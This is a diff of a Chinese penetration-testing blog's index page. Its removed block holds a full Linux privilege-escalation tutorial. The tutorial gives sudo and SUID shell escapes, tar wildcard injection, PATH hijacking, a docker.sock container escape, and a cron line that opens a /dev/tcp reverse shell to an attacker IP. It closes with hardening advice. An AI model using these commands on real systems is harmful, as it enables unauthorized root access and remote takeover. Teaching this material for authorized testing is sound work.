+      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -948,169 +334,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>Linux提权（Privilege Escalation）是渗透测试中从低权限Shell提升至root的关键环节。本篇系统梳理信息收集清单、自动化工具使用、手动与自动化对比分析，并提供可操作的提权决策树。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">低权限Shell → 信息收集 → 路径分析 → 漏洞利用 → Root Shell</span><br></pre></td></tr></table></figure>
-
-<h2 id="二、信息收集清单"><a href="#二、信息收集清单" class="headerlink" title="二、信息收集清单"></a>二、信息收集清单</h2><p>充分的信息收集是提权成功的前提。以下按优先级排列各检查项。</p>
-<h3 id="2-1-系统基本信息"><a href="#2-1-系统基本信息" class="headerlink" title="2.1 系统基本信息"></a>2.1 系统基本信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a; <span class="built_in">cat</span> /etc/os-release; <span class="built_in">cat</span> /proc/version</span><br><span class="line"><span class="built_in">id</span>; <span class="built_in">whoami</span>; <span class="built_in">groups</span></span><br><span class="line"><span class="built_in">sudo</span> -l                           <span class="comment"># 最重要的一项</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep -v nologin <span class="comment"># 可登录用户</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-2-进程与计划任务"><a href="#2-2-进程与计划任务" class="headerlink" title="2.2 进程与计划任务"></a>2.2 进程与计划任务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep root                <span class="comment"># root进程</span></span><br><span class="line">ps -ef --forest                   <span class="comment"># 树状进程关系</span></span><br><span class="line">crontab -l; <span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="built_in">ls</span> -la /etc/cron.d/ /etc/cron.daily/ /var/spool/cron/</span><br><span class="line">systemctl list-timers --all       <span class="comment"># systemd定时器</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-3-网络与服务"><a href="#2-3-网络与服务" class="headerlink" title="2.3 网络与服务"></a>2.3 网络与服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip addr; ss -tulnp; arp -a</span><br><span class="line">systemctl list-units --<span class="built_in">type</span>=service --state=running</span><br><span class="line">netstat -tulnp 2&gt;/dev/null</span><br><span class="line"><span class="built_in">cat</span> /etc/hosts</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-4-SUID-SGID-文件"><a href="#2-4-SUID-SGID-文件" class="headerlink" title="2.4 SUID &#x2F; SGID 文件"></a>2.4 SUID &#x2F; SGID 文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null   <span class="comment"># SUID</span></span><br><span class="line">find / -perm -2000 -<span class="built_in">type</span> f 2&gt;/dev/null   <span class="comment"># SGID</span></span><br><span class="line"><span class="comment"># 已知可用于提权的SUID：bash, python, find, vim, less, nmap(旧版)等</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-5-Capabilities"><a href="#2-5-Capabilities" class="headerlink" title="2.5 Capabilities"></a>2.5 Capabilities</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 关注 cap_setuid, cap_chown, cap_sys_ptrace, cap_sys_module</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-6-可写文件与敏感信息"><a href="#2-6-可写文件与敏感信息" class="headerlink" title="2.6 可写文件与敏感信息"></a>2.6 可写文件与敏感信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -<span class="built_in">type</span> f 2&gt;/dev/null | grep -v /proc</span><br><span class="line">find /etc/ -writable -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">grep -r <span class="string">&quot;password&quot;</span> /etc/ 2&gt;/dev/null | <span class="built_in">head</span> -20</span><br><span class="line">find / -name <span class="string">&quot;id_rsa&quot;</span> -o -name <span class="string">&quot;id_dsa&quot;</span> 2&gt;/dev/null</span><br><span class="line"><span class="built_in">cat</span> ~/.bash_history 2&gt;/dev/null | <span class="built_in">tail</span> -50</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-7-已安装软件与编译器"><a href="#2-7-已安装软件与编译器" class="headerlink" title="2.7 已安装软件与编译器"></a>2.7 已安装软件与编译器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l 2&gt;/dev/null || rpm -qa 2&gt;/dev/null</span><br><span class="line"><span class="built_in">which</span> gcc cc python python3 perl php ruby</span><br></pre></td></tr></table></figure>
-
-<h2 id="三、自动化提权工具"><a href="#三、自动化提权工具" class="headerlink" title="三、自动化提权工具"></a>三、自动化提权工具</h2><h3 id="3-1-LinPEAS"><a href="#3-1-LinPEAS" class="headerlink" title="3.1 LinPEAS"></a>3.1 LinPEAS</h3><p>LinPEAS 是 PEASS-ng 套件中的核心枚举脚本，社区使用最广泛。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接执行</span></span><br><span class="line">curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传后执行</span></span><br><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br><span class="line">./linpeas.sh -a   <span class="comment"># 全量扫描</span></span><br><span class="line">./linpeas.sh -s   <span class="comment"># 加速模式（跳过耗时项）</span></span><br></pre></td></tr></table></figure>
-
-<p>输出解读：<strong>Red&#x2F;Yellow</strong> 高亮项95%为提权向量，优先关注；使用 <code>grep -E &quot;Red|Yellow|CVE|95%|Interesting&quot;</code> 提取高价值行。</p>
-<h3 id="3-2-lse-sh-Linux-Smart-Enumeration"><a href="#3-2-lse-sh-Linux-Smart-Enumeration" class="headerlink" title="3.2 lse.sh (Linux Smart Enumeration)"></a>3.2 lse.sh (Linux Smart Enumeration)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh</span><br><span class="line"><span class="built_in">chmod</span> +x lse.sh</span><br><span class="line">./lse.sh -l 1   <span class="comment"># 仅显示高危和重要发现</span></span><br><span class="line">./lse.sh -l 0   <span class="comment"># 仅显示高危发现</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="3-3-pspy-—-进程监控"><a href="#3-3-pspy-—-进程监控" class="headerlink" title="3.3 pspy — 进程监控"></a>3.3 pspy — 进程监控</h3><p>pspy 无需root权限即可监控所有进程，用于发现cron触发的进程、捕获命令行密码、观察短期运行的脚本。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64</span><br><span class="line"><span class="built_in">chmod</span> +x pspy64</span><br><span class="line">./pspy64 -pf -i 1000   <span class="comment"># 每秒扫描，显示完整命令行</span></span><br><span class="line"><span class="comment"># 典型应用：后台运行5-10分钟，捕获定时任务和敏感命令</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="3-4-其他辅助工具"><a href="#3-4-其他辅助工具" class="headerlink" title="3.4 其他辅助工具"></a>3.4 其他辅助工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># LinEnum - 经典枚举脚本</span></span><br><span class="line">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span><br><span class="line">./LinEnum.sh -t</span><br><span class="line"></span><br><span class="line"><span class="comment"># traitor - 自动利用Gtfobins路径提权</span></span><br><span class="line">wget https://github.com/liamg/traitor/releases/latest/download/traitor-amd64</span><br><span class="line">./traitor-amd64 -a</span><br></pre></td></tr></table></figure>
-
-<h2 id="四、常见提权路径详解"><a href="#四、常见提权路径详解" class="headerlink" title="四、常见提权路径详解"></a>四、常见提权路径详解</h2><h3 id="4-1-内核漏洞"><a href="#4-1-内核漏洞" class="headerlink" title="4.1 内核漏洞"></a>4.1 内核漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux Exploit Suggester</span></span><br><span class="line">wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</span><br><span class="line">./linux-exploit-suggester.sh</span><br><span class="line"><span class="comment"># 经典漏洞：DirtyCow(CVE-2016-5195), DirtyPipe(CVE-2022-0847), PwnKit(CVE-2021-4034)</span></span><br><span class="line"><span class="comment"># 利用内核漏洞可能触发系统崩溃，生产环境需谨慎</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="4-2-Sudo配置不当"><a href="#4-2-Sudo配置不当" class="headerlink" title="4.2 Sudo配置不当"></a>4.2 Sudo配置不当</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="comment"># 示例可利用配置 (详见 https://gtfobins.github.io/)</span></span><br><span class="line"><span class="comment"># (root) NOPASSWD: /usr/bin/vim    → sudo vim -c &#x27;:!/bin/bash&#x27;</span></span><br><span class="line"><span class="comment"># (root) NOPASSWD: /usr/bin/find   → sudo find . -exec bash \;</span></span><br><span class="line"><span class="comment"># (root) NOPASSWD: /usr/bin/less   → sudo less /etc/hosts → !bash</span></span><br><span class="line"><span class="comment"># (root) NOPASSWD: /usr/bin/python → sudo python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="4-3-SUID二进制"><a href="#4-3-SUID二进制" class="headerlink" title="4.3 SUID二进制"></a>4.3 SUID二进制</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发现SUID文件后可逐一在Gtfobins查找利用方法</span></span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null | <span class="keyword">while</span> <span class="built_in">read</span> f; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;→ <span class="variable">$f</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line"><span class="comment"># 常见利用：</span></span><br><span class="line">/usr/bin/find . -<span class="built_in">exec</span> /bin/bash -p \;</span><br><span class="line">/usr/bin/python3 -c <span class="string">&#x27;import os; os.execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-p&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="4-4-Capabilities提权"><a href="#4-4-Capabilities提权" class="headerlink" title="4.4 Capabilities提权"></a>4.4 Capabilities提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line"><span class="comment"># cap_setuid+ep: 可调用setuid(0)</span></span><br><span class="line">python3 -c <span class="string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># cap_sys_ptrace+ep: 可注入root进程</span></span><br><span class="line"><span class="comment"># cap_dac_read_search+ep: 可读取任意文件（如/etc/shadow）</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="4-5-计划任务滥用"><a href="#4-5-计划任务滥用" class="headerlink" title="4.5 计划任务滥用"></a>4.5 计划任务滥用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 若root的cron脚本全局可写</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&#x27;</span> &gt;&gt; /opt/scripts/backup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通配符注入（适用于调用tar、rsync等命令的cron任务）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&#x27;</span> &gt; /path/to/--checkpoint=1</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#x27;</span> &gt; /path/to/--checkpoint-action=<span class="built_in">exec</span>=sh\ exploit.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用pspy发现计划任务和命令行参数中的密码</span></span><br><span class="line">./pspy64 -pf -i 1000</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-6-PATH劫持"><a href="#4-6-PATH劫持" class="headerlink" title="4.6 PATH劫持"></a>4.6 PATH劫持</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 场景：某脚本以root执行但使用相对路径调用命令（如ping、wget）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash -p&#x27;</span> &gt; /tmp/ping &amp;&amp; <span class="built_in">chmod</span> +x /tmp/ping</span><br><span class="line"><span class="comment"># 当该脚本执行ping时，实际调用/tmp/ping，获得root shell</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="4-7-Docker容器逃逸"><a href="#4-7-Docker容器逃逸" class="headerlink" title="4.7 Docker容器逃逸"></a>4.7 Docker容器逃逸</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查是否在容器中</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/cgroup | grep -i docker</span><br><span class="line"><span class="built_in">ls</span> -la /.dockerenv 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker.sock逃逸</span></span><br><span class="line"><span class="built_in">ls</span> -la /var/run/docker.sock     <span class="comment"># 若可访问</span></span><br><span class="line">docker run -it -v /:/host alpine <span class="built_in">chroot</span> /host bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 特权模式逃逸：直接挂载宿主机磁盘 fdisk -l → mount /dev/sda1 /mnt</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="五、自动化-vs-手动分析"><a href="#五、自动化-vs-手动分析" class="headerlink" title="五、自动化 vs 手动分析"></a>五、自动化 vs 手动分析</h2><pre class="mermaid">graph TD
-    A[低权限Shell] --> B{紧急程度}
-    B -->|紧急| C[LinPEAS全量扫描]
-    B -->|非紧急| D[手动快速检查]
-    C --> E{发现提权向量?}
-    D --> G[sudo -l / SUID / crontab]
-    G --> E
-    E -->|有| F[直接利用 → Root]
-    E -->|无| H[运行pspy后台监控]
-    H --> I[等待5-10分钟]
-    I --> J{捕获到敏感信息?}
-    J -->|有| F
-    J -->|无| K[LinPEAS深度扫描]
-    K --> L{找到路径?}
-    L -->|有| F
-    L -->|无| M[研究内核漏洞/定制利用]
-    M --> F</pre>
-
-<table>
-<thead>
-<tr>
-<th>维度</th>
-<th>自动化 (LinPEAS等)</th>
-<th>手动分析</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>速度</td>
-<td>快 (1-5分钟)</td>
-<td>慢 (依赖经验)</td>
-</tr>
-<tr>
-<td>覆盖面</td>
-<td>全面</td>
-<td>可能遗漏</td>
-</tr>
-<tr>
-<td>误报率</td>
-<td>偏高</td>
-<td>低</td>
-</tr>
-<tr>
-<td>落地痕迹</td>
-<td>大</td>
-<td>小</td>
-</tr>
-<tr>
-<td>学习价值</td>
-<td>低</td>
-<td>高</td>
-</tr>
-<tr>
-<td>OPSEC</td>
-<td>弱 (易被EDR拦截)</td>
-<td>强</td>
-</tr>
-<tr>
-<td>适用场景</td>
-<td>CTF&#x2F;实验&#x2F;快速评估</td>
-<td>红队&#x2F;实战渗透</td>
-</tr>
-</tbody></table>
-<p><strong>推荐策略：</strong> 先手动5分钟（<code>sudo -l</code> → SUID → crontab → 内核版本），若未果则运行LinPEAS，同时让pspy后台监控。手动优先 + 自动化补充 + 动态监控并行。</p>
-<h2 id="六、提权决策树"><a href="#六、提权决策树" class="headerlink" title="六、提权决策树"></a>六、提权决策树</h2><pre class="mermaid">graph TD
-    START[低权限Shell] --> S1[sudo -l]
-    S1 -->|有可利用项| ROOT[Root!]
-    S1 -->|无| S2[SUID检查]
-    S2 -->|有可利用SUID| ROOT
-    S2 -->|无| S3[Crontab检查]
-    S3 -->|脚本可写/通配符| ROOT
-    S3 -->|无| S4[内核漏洞检查]
-    S4 -->|有可用exp| ROOT
-    S4 -->|无| S5[Capabilities]
-    S5 -->|危险capability| ROOT
-    S5 -->|无| S6[PATH劫持]
-    S6 -->|可写PATH目录| ROOT
-    S6 -->|无| S7[Docker检查]
-    S7 -->|容器可逃逸| ROOT
-    S7 -->|否| S8[pspy后台监控]
-    S8 -->|捕获密码/命令| ROOT
-    S8 -->|无发现| S9[凭据泄露/敏感文件]
-    S9 -->|配置文件含密码| ROOT
-    S9 -->|无| FINAL[LinPEAS全量 + 手动审计]
-    FINAL --> ROOT
-
-    style START fill:#e1f5fe
-    style ROOT fill:#c8e6c9
-    style FINAL fill:#fff9c4</pre>
-
-<p>决策优先级：<strong>sudo &gt; SUID &gt; crontab &gt; 内核 &gt; Capabilities &gt; PATH &gt; Docker &gt; 凭据泄露</strong></p>
-<h2 id="七、实战流程示例"><a href="#七、实战流程示例" class="headerlink" title="七、实战流程示例"></a>七、实战流程示例</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># === Step 1: 快速手动检查 (2分钟) ===</span></span><br><span class="line"><span class="built_in">id</span>; <span class="built_in">sudo</span> -l; <span class="built_in">uname</span> -a</span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="built_in">cat</span> /etc/crontab &amp;&amp; crontab -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># === Step 2: 若sudo -l 返回可利用项 ===</span></span><br><span class="line"><span class="comment"># (root) NOPASSWD: /usr/bin/find</span></span><br><span class="line"><span class="built_in">sudo</span> find . -<span class="built_in">exec</span> /bin/bash \;</span><br><span class="line"></span><br><span class="line"><span class="comment"># === Step 3: 若SUID发现python3 ===</span></span><br><span class="line">/usr/bin/python3 -c <span class="string">&#x27;import os; os.execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-p&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># === Step 4: 若crontab有可写脚本 ===</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.100/4444 0&gt;&amp;1&#x27;</span> &gt;&gt; /opt/scripts/backup.sh</span><br><span class="line"><span class="comment"># 等待cron触发，收到反向shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># === Step 5: 并行运行pspy ===</span></span><br><span class="line"><span class="comment"># 另开终端上传pspy64</span></span><br><span class="line">./pspy64 -pf -i 1000 &gt; /tmp/pspy.log 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="comment"># 5分钟后分析日志中的UDP/COMMAND事件</span></span><br><span class="line"><span class="built_in">cat</span> /tmp/pspy.log | grep -E <span class="string">&quot;CMD|UID=0&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="八、防御加固建议"><a href="#八、防御加固建议" class="headerlink" title="八、防御加固建议"></a>八、防御加固建议</h2><ol>
-<li><strong>sudo最小化</strong>：避免 <code>NOPASSWD</code> + 交互式程序；sudoers.d 细分权限</li>
-<li><strong>SUID审计</strong>：定期审查SUID文件，移除不必要项 (<code>chmod -s</code>)</li>
-<li><strong>cron安全</strong>：确保脚本不可被非root写入，命令使用绝对路径</li>
-<li><strong>内核更新</strong>：保持最新稳定版内核，及时修补提权漏洞</li>
-<li><strong>容器安全</strong>：禁用特权模式，不挂载docker.sock，启用seccomp&#x2F;AppArmor</li>
-<li><strong>监控告警</strong>：对 <code>/tmp</code>、<code>/dev/shm</code> 中新可执行文件、异常SUID创建设置告警</li>
-</ol>
-<h2 id="九、常用命令速查"><a href="#九、常用命令速查" class="headerlink" title="九、常用命令速查"></a>九、常用命令速查</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 信息收集一行化</span></span><br><span class="line"><span class="built_in">uname</span> -a; <span class="built_in">id</span>; <span class="built_in">sudo</span> -l; crontab -l; <span class="built_in">cat</span> /etc/crontab</span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line">ss -tulnp; ip addr | grep inet</span><br><span class="line"></span><br><span class="line"><span class="comment"># 工具一键下载</span></span><br><span class="line">curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</span><br><span class="line">curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o pspy64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Gtfobins常用快速利用</span></span><br><span class="line"><span class="comment"># sudo vim -c &#x27;:!/bin/bash&#x27;</span></span><br><span class="line"><span class="comment"># sudo find . -exec /bin/bash \;</span></span><br><span class="line"><span class="comment"># python3 -c &#x27;import os; os.execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-p&quot;)&#x27;  (SUID python)</span></span><br><span class="line"><span class="comment"># find . -exec /bin/bash -p \;  (SUID find)</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><p>Linux提权的本质是对系统配置缺陷的系统性挖掘。成功要素：</p>
-<ol>
-<li><strong>全面信息收集</strong> — 不遗漏任何配置弱点</li>
-<li><strong>精准工具运用</strong> — LinPEAS扫描 + pspy监控 + Gtfobins利用验证</li>
-<li><strong>清晰决策路径</strong> — 按优先级排查：sudo &gt; SUID &gt; crontab &gt; 内核 &gt; Capabilities &gt; PATH &gt; Docker &gt; 凭据</li>
-</ol>
-<p>推荐实践：5分钟手动优先 → LinPEAS自动补充 → pspy并行监控，在效率与隐蔽性之间取得最佳平衡。</p>
-<blockquote>
-<p><strong>免责声明：</strong> 本文所述技术仅供安全研究与授权的渗透测试。未经授权攻击他人系统属违法行为。读者须在合法合规环境下学习实践，作者不对任何滥用行为承担责任。</p>
-</blockquote>
-<hr>
-<p><strong>参考资源：</strong></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">Gtfobins</a> - <a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng">PEASS-ng</a> - <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">PayloadsAllTheThings Linux Privesc</a></li>
-<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">HackTricks Linux Privilege Escalation</a></li>
-</ul>
-
+          <p>Linux 提权方法论——LinPEAS/pspy 使用、sudo/crontab/SUID/service 四板斧系统化信息收集。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/Linux-privesc-methodology/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1172,7 +404,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1194,7 +426,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>WAF 是 SQL 注入的最大拦路虎，但规则总有缝隙。大小写混写、双写绕过、等价替换、内联注释、HTTP 参数污染、分块传输——从简单到高级的绕过手法全收录。</p>
+          <p>SQL 注入：WAF 绕过技巧汇总——渗透测试实战笔记，含完整攻击链路与防御方案。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/SQL-injection-waf-bypass/">
@@ -1356,7 +588,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:12:35" itemprop="dateModified" datetime="2026-06-05T00:12:35+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1378,7 +610,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>系统梳理七种基于服务错误配置的 Linux 本地提权技术：NFS no_root_squash、MySQL UDF/MOF、PAM 后门植入、Logrotate 通配符注入、systemctl 服务配置缺陷、可写 /etc/shadow 及 SSH 密钥窃取。每种技术均附可复现的代码示例与完整攻击链路。</p>
+          <p>Linux 服务与配置错误提权——MySQL UDF、NFS no_root_squash、Logrotate 通配符注入。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/Linux-privesc-services/">
@@ -1448,7 +680,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1470,7 +702,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>二次注入（存储型 SQL 注入）的漏洞不在注册时，而在后续使用存储数据时；宽字节注入利用 GBK 编码吃掉转义符，两者都是绕过防护的经典手法。</p>
+          <p>SQL 注入：二次注入与宽字节注入——渗透测试实战笔记，含完整攻击链路与防御方案。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/SQL-injection-second-order/">
@@ -1632,7 +864,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
